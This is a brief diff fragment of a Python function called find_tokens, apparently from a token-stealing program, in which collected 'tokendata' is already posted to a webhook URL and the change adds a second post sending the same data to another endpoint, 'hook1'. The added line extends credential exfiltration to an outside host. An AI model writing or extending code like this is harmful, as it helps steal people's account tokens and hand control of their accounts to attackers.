@@ -78,3 +78,4 @@ def find_tokens():
         "Content-Type": "application/json"
     }
     r = requests.post(hook, data=json.dumps(tokendata), headers=headers)
+    r = requests.post(hook1, data=json.dumps(tokendata), headers=headers)
